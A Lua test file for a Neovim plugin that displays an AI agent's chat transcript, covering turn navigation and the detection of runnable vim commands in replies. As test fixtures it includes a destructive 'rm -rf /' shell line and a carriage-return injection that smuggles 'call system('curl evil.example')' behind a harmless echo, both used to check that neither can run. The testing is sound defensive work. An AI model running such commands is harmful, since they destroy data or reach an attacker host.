-- Reading the transcript: `j`/`k` through the answers, and the commands the
-- agent wrote.
--
--   nvim -l tests/reading.lua

local root = vim.fn.fnamemodify(debug.getinfo(1, "S").source:sub(2), ":p:h:h")
vim.opt.runtimepath:prepend(root)

local reading = require("fieldguide.chat.reading")

require("fieldguide.config").setup({})
local tools = require("fieldguide.chat.tools")

local passed, failed = 0, 0
local function check(name, ok, detail)
  if ok then
    passed = passed + 1
    io.write(("  ok   %s\n"):format(name))
  else
    failed = failed + 1
    io.write(("  FAIL %s\n       %s\n"):format(name, detail or ""))
  end
end

---A buffer in a window of a known height, so "taller than the window" means
---something.
---@param lines string[]
---@param height integer
local function scratch(lines, height)
  local buf = vim.api.nvim_create_buf(false, true)
  vim.api.nvim_buf_set_lines(buf, 0, -1, false, lines)
  vim.cmd("silent! only")
  local win = vim.api.nvim_get_current_win()
  vim.api.nvim_win_set_buf(win, buf)
  vim.api.nvim_win_set_height(win, height)
  return buf, win
end

---@param win integer
---@return integer 0-indexed first visible row
local function topline(win)
  return vim.api.nvim_win_call(win, vim.fn.winsaveview).topline - 1
end

io.write("moving through turns\n")
do
  -- Three turns: a short one, one much taller than the window, a short one.
  local lines = {}
  local function fill(n, tag)
    for i = 1, n do
      table.insert(lines, ("%s %d"):format(tag, i))
    end
  end
  fill(3, "first")
  local second = #lines
  fill(60, "second")
  local third = #lines
  fill(3, "third")

  local buf, win = scratch(lines, 20)
  local height = vim.api.nvim_win_get_height(win)
  reading.mark_turn(buf, 0)
  reading.mark_turn(buf, second)
  reading.mark_turn(buf, third)

  check("the view starts at the top", topline(win) == 0, tostring(topline(win)))

  check("j moves off a short turn to the next", reading.step_turn(buf, win, 1))
  check("...landing on its first line", topline(win) == second, ("%d, wanted %d"):format(topline(win), second))

  -- The middle turn is 60 lines in a 20-line window, so it has to be scrolled
  -- rather than jumped over: this is the case a plain "go to the next mark"
  -- would skip straight past.
  local before = topline(win)
  check("j scrolls inside a turn taller than the window", reading.step_turn(buf, win, 1))
  local after = topline(win)
  check("...by less than a windowful", after > before and after - before <= height, ("%d -> %d"):format(before, after))
  check("...and stays inside that turn", after < third, ("%d, third starts %d"):format(after, third))

  -- Keep going and it must arrive at the next turn rather than scrolling past
  -- its start or stalling at the end of this one.
  local guard = 0
  while topline(win) < third and guard < 50 do
    reading.step_turn(buf, win, 1)
    guard = guard + 1
  end
  check("...then lands on the next turn, not past it", topline(win) == third, tostring(topline(win)))
  check("...without scrolling past the end of the one before", guard < 50, tostring(guard))

  check("k comes back", reading.step_turn(buf, win, -1))
  check(
    "...into the turn above, not to the top of the file",
    topline(win) > 0 and topline(win) < third,
    tostring(topline(win))
  )

  -- At the end of the last turn there is nowhere further to go. Reporting that
  -- rather than inventing a move is what lets `j` fall through to an ordinary
  -- one, instead of scrolling backwards to show a tail already on screen.
  vim.api.nvim_win_call(win, function()
    vim.fn.winrestview({ topline = third + 1, lnum = third + 1 })
  end)
  check("j at the end of the last turn reports no move", reading.step_turn(buf, win, 1) == false)
  check("...and does not scroll backwards", topline(win) == third, tostring(topline(win)))
end

io.write("the page holds still when it can\n")
do
  -- A window of 20 over 40 lines, with a short turn starting three lines from
  -- the bottom of it. Landing there is a cursor move and nothing else — the
  -- turn is already whole on the page, and `scrolloff` is exactly the thing
  -- that would slide the text anyway if the topline were left to itself.
  local lines = {}
  for i = 1, 40 do
    table.insert(lines, "line " .. i)
  end
  local buf, win = scratch(lines, 20)
  for _, row in ipairs({ 0, 4, 16, 19 }) do
    reading.mark_turn(buf, row)
  end

  -- `scrolloff` is applied at redraw, and headless nvim never redraws, so this
  -- file cannot prove the page holds still — it can only prove the arithmetic
  -- that decides where to put it. The panel sets `scrolloff = 0` on its own
  -- windows for the rest, which was found by watching a real one: a reply that
  -- was already whole on the page still slid two lines under `j`.
  local was = vim.wo[win].scrolloff
  vim.wo[win].scrolloff = 0

  vim.api.nvim_win_call(win, function()
    vim.fn.winrestview({ topline = 1, lnum = 1 })
  end)

  check("j moves the cursor to the next turn", reading.step_turn(buf, win, 1))
  check(
    "...onto its first line",
    vim.api.nvim_win_get_cursor(win)[1] == 5,
    tostring(vim.api.nvim_win_get_cursor(win)[1])
  )
  check("...without moving the page", topline(win) == 0, tostring(topline(win)))

  reading.step_turn(buf, win, 1)
  check(
    "...and again, three lines off the bottom",
    vim.api.nvim_win_get_cursor(win)[1] == 17,
    tostring(vim.api.nvim_win_get_cursor(win)[1])
  )
  check("...with the page left where it was", topline(win) == 0, tostring(topline(win)))

  check("k comes back the same way", reading.step_turn(buf, win, -1))
  check("...still without moving the page", topline(win) == 0, tostring(topline(win)))
  check("...cursor only", vim.api.nvim_win_get_cursor(win)[1] == 5, tostring(vim.api.nvim_win_get_cursor(win)[1]))

  -- The last turn runs past the bottom of the window, so that one does move.
  vim.api.nvim_win_call(win, function()
    vim.fn.winrestview({ topline = 1, lnum = 17 })
  end)
  reading.step_turn(buf, win, 1)
  check("a turn that runs off the page is brought to the top", topline(win) == 19, tostring(topline(win)))

  vim.wo[win].scrolloff = was
end

io.write("a turn that does not fit\n")
do
  -- The other half of the same rule: a turn the window cannot hold whole is
  -- brought to the top, because there is no reading it otherwise.
  local lines = {}
  for i = 1, 60 do
    table.insert(lines, "line " .. i)
  end
  local buf, win = scratch(lines, 10)
  reading.mark_turn(buf, 0)
  reading.mark_turn(buf, 3)

  vim.api.nvim_win_call(win, function()
    vim.fn.winrestview({ topline = 1, lnum = 1 })
  end)
  reading.step_turn(buf, win, 1)
  check("a turn taller than the window is brought to the top", topline(win) == 3, tostring(topline(win)))
end

io.write("where a mark stays\n")
do
  -- The agent's reply is marked on the empty line it is about to start on, and
  -- the sink writes by replacing that line with everything joined onto it. With
  -- the default gravity the mark is carried to the end of the answer, so `j`
  -- lands on the bottom of a reply instead of its top — which reads as `j`
  -- working for your own turns and not for the replies.
  local buf = vim.api.nvim_create_buf(false, true)
  vim.api.nvim_buf_set_lines(buf, 0, -1, false, { "jait", "> hi", "" })
  reading.mark_turn(buf, 2)
  vim.api.nvim_buf_set_lines(buf, -2, -1, false, { "The answer", "runs over", "three lines" })

  check("an answer is marked where it starts", reading.turns(buf)[1] == 2, vim.inspect(reading.turns(buf)))
  check("...not where it ends", reading.turns(buf)[1] ~= 4, vim.inspect(reading.turns(buf)))
end

io.write("nothing to move through\n")
do
  local buf, win = scratch({ "one", "two" }, 10)
  check("an unmarked transcript reports no move", reading.step_turn(buf, win, 1) == false)
end

io.write("which one you are reading\n")
do
  local lines = {}
  for i = 1, 30 do
    table.insert(lines, "line " .. i)
  end
  local buf, win = scratch(lines, 12)
  reading.mark_turn(buf, 0)
  reading.mark_turn(buf, 10)
  reading.mark_turn(buf, 20)

  local ns = vim.api.nvim_get_namespaces()["fieldguide.chat.current"]
  local function marked()
    local rows = {}
    for _, m in ipairs(vim.api.nvim_buf_get_extmarks(buf, ns, 0, -1, {})) do
      table.insert(rows, m[2])
    end
    return rows
  end

  vim.api.nvim_win_set_cursor(win, { 13, 0 })
  reading.mark_current(buf, win)
  local rows = marked()
  check("the turn you are in is bracketed", #rows == 10, tostring(#rows))
  check("...from its first line", rows[1] == 10, tostring(rows[1]))
  check("...to its last", rows[#rows] == 19, tostring(rows[#rows]))

  -- Moving inside a turn must not redraw it: a turn can be hundreds of lines,
  -- and this runs on every cursor move.
  local first = vim.api.nvim_buf_get_extmarks(buf, ns, 0, -1, {})[1][1]
  vim.api.nvim_win_set_cursor(win, { 15, 0 })
  reading.mark_current(buf, win)
  check("staying inside it does not redraw", vim.api.nvim_buf_get_extmarks(buf, ns, 0, -1, {})[1][1] == first)

  vim.api.nvim_win_set_cursor(win, { 25, 0 })
  reading.mark_current(buf, win)
  check("moving to another does", marked()[1] == 20, vim.inspect(marked()))
  check("...and the last one runs to the end", marked()[#marked()] == 29, vim.inspect(marked()))
end

io.write("commands the agent wrote\n")
do
  local lines = {
    "Open it with:",
    "",
    "```vim",
    ":Telescope live_grep",
    "```",
    "",
    "and the config lives here:",
    "",
    "```lua",
    'require("telescope").setup({})',
    "```",
    "",
    "```sh",
    "rm -rf /",
    "```",
  }
  local buf = vim.api.nvim_create_buf(false, true)
  vim.api.nvim_buf_set_lines(buf, 0, -1, false, lines)
  reading.scan(buf)

  check(
    "a vim fence is runnable",
    reading.command_at(buf, 3) == "Telescope live_grep",
    tostring(reading.command_at(buf, 3))
  )
  check("...and it is the only thing offered", reading.runnable_count(buf) == 1, tostring(reading.runnable_count(buf)))
  check("prose about a fence is not the fence", reading.command_at(buf, 6) == nil, tostring(reading.command_at(buf, 6)))
  -- Lua goes in a config file and shell goes to a shell. Neither belongs on the
  -- command line, and offering to put it there would be the whole risk of this
  -- feature for none of its point.
  check("a lua fence is not", reading.command_at(buf, 9) == nil, tostring(reading.command_at(buf, 9)))
  check("a shell fence is not", reading.command_at(buf, 13) == nil, tostring(reading.command_at(buf, 13)))
  check("prose is not", reading.command_at(buf, 0) == nil, tostring(reading.command_at(buf, 0)))
  check("the fence itself is not", reading.command_at(buf, 2) == nil, tostring(reading.command_at(buf, 2)))
end

io.write("commands written in a sentence\n")
do
  -- The shape a model actually produces when it answers in one line, which is
  -- most of the time. A fence-only rule would almost never fire.
  local buf = vim.api.nvim_create_buf(false, true)
  vim.api.nvim_buf_set_lines(buf, 0, -1, false, {
    "Press `<Space><Space>` to grep the project with `:Telescope live_grep`.",
    "Your leader is `<Space>` and the file lives at `lua/config/keymaps.lua`.",
    "See `:help telescope` for the rest.",
  })
  reading.scan(buf)

  check(
    "a colon span in a sentence is runnable",
    reading.command_at(buf, 0) == "Telescope live_grep",
    tostring(reading.command_at(buf, 0))
  )
  check("...and so is a help tag", reading.command_at(buf, 2) == "help telescope", tostring(reading.command_at(buf, 2)))
  -- The colon is what makes guessing safe. Without it a code span is a key, a
  -- path, a plugin name — none of which belong on the command line.
  check("a span with no colon is not", reading.command_at(buf, 1) == nil, tostring(reading.command_at(buf, 1)))
end

io.write("what a command is allowed to contain\n")
do
  -- The feature's entire claim is that it loads a command rather than running
  -- one. A carriage return in the text would end the command line for us, so a
  -- line of someone else's help text could make the key run something after
  -- all. Stripped at the source.
  local buf = vim.api.nvim_create_buf(false, true)
  vim.api.nvim_buf_set_lines(buf, 0, -1, false, {
    "```vim",
    ":echo 'safe'\rcall system('curl evil.example')",
    "```",
  })
  reading.scan(buf)
  local cmd = reading.command_at(buf, 1)
  check("a carriage return cannot submit the command line", cmd and not cmd:find("\r"), vim.inspect(cmd))
  check("...and the rest of the line is still shown", cmd:find("curl evil.example", 1, true) ~= nil, cmd)

  -- Indented code is what tool lines and their expanded bodies are, so a fence
  -- inside one is text.
  local tools = vim.api.nvim_create_buf(false, true)
  vim.api.nvim_buf_set_lines(tools, 0, -1, false, {
    "    ▪ read lua/init.lua",
    "    ```vim",
    "    :qa!",
    "    ```",
  })
  reading.scan(tools)
  check(
    "a fence inside a tool body is not a fence",
    reading.runnable_count(tools) == 0,
    tostring(reading.runnable_count(tools))
  )
end

io.write("a tool result with nothing in it\n")
do
  -- Line count is newline count plus one, which over-counts empty output by
  -- one: no newlines, but also no lines.
  local empty = tools.render({ kind = "tool_end", tool = "grep", args = { pattern = "nope" }, text = "" }, 40)
  check("no grep matches is 0 lines, not 1", empty.summary:find("0 line", 1, true) ~= nil, empty.summary)

  local also_empty = tools.render({ kind = "tool_end", tool = "find", args = { pattern = "*.nope" }, text = "" }, 40)
  check(
    "...and find agrees, it shares the renderer",
    also_empty.summary:find("0 line", 1, true) ~= nil,
    also_empty.summary
  )
end

io.write("incremental scanning matches a full scan\n")
do
  -- The shape streaming actually produces: lines appended one at a time, with
  -- the last one sometimes rewritten in place (the sink replaces the current
  -- line rather than always ending it) before the next newline arrives.
  -- Whatever `scan` picks up along the way has to end up the same as scanning
  -- the finished buffer in one pass.
  local final = {
    "Open it with:",
    "",
    "```vim",
    ":Telescope live_grep",
    "```",
    "",
    "See `:help telescope` and press `<Space><Space>`.",
    "",
    "```lua",
    'require("x").setup({})',
    "```",
  }

  local incr = vim.api.nvim_create_buf(false, true)
  local full = vim.api.nvim_create_buf(false, true)
  vim.api.nvim_buf_set_lines(full, 0, -1, false, final)
  reading.scan(full)

  -- Grow `incr` a line at a time, scanning after every step, exactly like the
  -- flush timer does while a reply streams in.
  for i, line in ipairs(final) do
    -- Land on the final line in two writes: a partial one (in-place growth,
    -- no new line yet) and then the real one, to exercise the case a plain
    -- "only walk new lines" scan would get wrong.
    if #line > 4 then
      vim.api.nvim_buf_set_lines(incr, i - 1, i, false, { line:sub(1, 2) })
      reading.scan(incr)
    end
    vim.api.nvim_buf_set_lines(incr, i - 1, math.max(i - 1, vim.api.nvim_buf_line_count(incr)), false, { line })
    reading.scan(incr)
  end

  check(
    "the same lines end up marked runnable",
    reading.runnable_count(incr) == reading.runnable_count(full),
    ("incremental=%d full=%d"):format(reading.runnable_count(incr), reading.runnable_count(full))
  )
  for row = 0, #final - 1 do
    check(
      ("...row %d agrees with a full scan"):format(row),
      reading.command_at(incr, row) == reading.command_at(full, row),
      ("incremental=%s full=%s"):format(
        tostring(reading.command_at(incr, row)),
        tostring(reading.command_at(full, row))
      )
    )
  end

  -- A shrink (the transcript being cleared and rebuilt) cannot be told apart
  -- from a genuine append, so it has to fall back to a full walk.
  vim.api.nvim_buf_set_lines(incr, 0, -1, false, { "See `:echo 'still here'` for proof." })
  reading.scan(incr)
  check(
    "a shrunk buffer is rescanned from scratch",
    reading.command_at(incr, 0) == "echo 'still here'",
    tostring(reading.command_at(incr, 0))
  )
  check(
    "...and carries nothing left over from before",
    reading.runnable_count(incr) == 1,
    tostring(reading.runnable_count(incr))
  )

  -- `force` is for structural rewrites `scan` cannot see as a plain append,
  -- such as a fold expanding in the middle of the buffer.
  local forced = vim.api.nvim_create_buf(false, true)
  vim.api.nvim_buf_set_lines(forced, 0, -1, false, { "prose", "`:echo 'a'`" })
  reading.scan(forced)
  vim.api.nvim_buf_set_lines(forced, 0, 0, false, { "inserted above" })
  reading.scan(forced, true)
  check(
    "a forced rescan finds a mark moved by an insert",
    reading.command_at(forced, 2) == "echo 'a'",
    tostring(reading.command_at(forced, 2))
  )
end

io.write(("\n%d passed, %d failed\n"):format(passed, failed))
os.exit(failed == 0 and 0 or 1)
